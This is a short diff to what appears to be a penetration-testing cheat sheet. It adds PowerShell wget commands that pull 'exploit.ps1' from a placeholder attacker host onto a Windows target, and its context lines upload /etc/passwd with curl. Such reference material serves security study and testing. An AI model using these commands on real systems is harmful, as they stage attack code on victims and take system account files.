@@ -3936,6 +3936,13 @@ $ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
 $ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
 ```
 
+- PowerShell Wget (Kali -> Windows)
+
+```
+PS C:\> wget http://<IP address>:8000/exploit.ps1 -o exploit.ps1
+PS C:\> powershell -c wget http://<IP address>:8000/exploit.ps1 -o exploit.ps1
+```
+
 - PowerShell DownloadFile (Kali -> Windows)
 
 ```
